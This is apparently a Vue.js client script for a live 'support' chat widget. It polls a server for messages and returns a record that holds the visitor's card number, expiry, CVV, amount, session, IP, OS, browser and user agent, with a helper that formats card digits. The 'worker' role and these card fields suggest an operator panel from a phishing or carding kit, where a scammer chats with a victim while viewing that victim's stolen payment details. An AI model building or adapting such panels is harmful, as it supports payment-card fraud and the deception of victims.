import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js'
import axios from 'https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.8/esm/axios.min.js'
const kkk = "0814ff6004ac400dd2d8c3ff2c832ed95b4ce8f930c56f406edaf73a419eb777"
createApp({
    data() {
        return {
            id: 1,
            i: "worker",
            ticket: false,
            ticket_name_show: false,
            ticket_name_error: "",
            text: "",
            messages: [],
            info: {
                email: "",
                contactemail: "",
                firstname: "",
                lastname: "",
                mobilenumber: "",
                cardnumber: "",
                validity: "",
                cvv: "",
                sum: "",
                state: "",
                sessId: "",
                device: "",
                ip: "",
                os: "",
                browser: "",
                ua: "",
                ticket: "",
                ticket_username: "",
                ticket_email: "",
                ticket_phone: "",
                ticket_notification: "",
            }
        }
    },
    mounted() {
        console.log("[mounted]")
        this.ping()
        let id = localStorage.getItem(kkk.slice(0, 10))

        console.log(id)

        if (!id) {
            id = crypto.randomUUID().replaceAll("-", "P")
            localStorage.setItem(kkk.slice(0, 10), id)
        }
        this.id = id
    },
    methods: {
        validateEmail(email) {
            return email.match(
                /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            )
        },
        send(e) {
            let el = document.getElementById("text")
            let text = el.value.trim()
            el.value = ""

            if (!this.ticket) {
                this.text = text
                this.ticket_name_show = true
                el.disabled = true
                return
            }

            axios({
                method: "post",
                url: "/api/send",
                data: {
                    id: this.id,
                    text
                }
            }).then(d => {
                console.log(d)
            }).catch(console.log)
        },
        sendFirst(e) {
            let el = document.getElementById("text")
            let sname_el = document.getElementById("sname")
            let sphone_el = document.getElementById("sphone")
            let semail_el = document.getElementById("semail")

            let sname = sname_el.value.trim()
            let sphone = sphone_el.value.trim()
            let semail = semail_el.value.trim()

            if (sname.length < 4 && (sphone.length < 6 || !this.validateEmail(semail))) {
                this.ticket_name_error = "Please fill your name and phone or email"
                return
            }
            this.ticket_name_show = false
            el.disabled = false

            axios({
                method: "post",
                url: "/api/send",
                data: {
                    text: this.text,
                    username: sname,
                    phone: sphone,
                    email: semail,
                    id: this.id
                }
            }).then(d => {
                console.log(d)
            }).catch(console.log)
        },
        toggle(e) {
            let s = document.getElementById("support")
            if (s.classList.contains("sup__open")) {
                s.classList.remove("sup__open")
                s.classList.add("sup__close")
            } else {
                s.classList.remove("sup__close")
                s.classList.add("sup__open")
            }
        },
        formatDate(date) {
            let d = new Date(date)
            return `${d.getDay()}/${d.getDate()}/${d.getFullYear()} ${d.getHours()}:${d.getMinutes()}`
        },
        formatCard(num) {
            if (!num) return ""
            let n = ""
            let it = 1
            num.split("").map(s => {
                n += s + (it % 4 == 0 ? " " : "")
                it++
            })
            return n
        },
        isMy(t) {
            if (t == this.i) {
                return "my"
            }
            return "user"
        },
        async ping() {
            try {
                let r = await axios({
                    method: "post",
                    url: "/api/pool",
                    data: {
                        id: this.id,
                        yep: "yep"
                    }
                })

                this.messages = r.data.messages
                this.info = r.data.info
                this.i = r.data.i
                this.ticket = r.data.ticket
            } catch (e) { }

            setTimeout(this.ping, 2000)
        }
    }
}).mount('#app')


let showModalSupport = () => {
	document.getElementById('modal-support').style.bottom=0;
	document.getElementById('modal-header-2').style.display = "none";
	document.getElementById('modal-header-1').style.display = "block";
	document.getElementById('close-button').style.display = "block";
}
let closeModalSupport = () => {
	document.getElementById('modal-support').style.bottom='-583px';
	document.getElementById('modal-header-2').style.display = "block";
	document.getElementById('modal-header-1').style.display = "none";
	document.getElementById('close-button').style.display = "none";
}
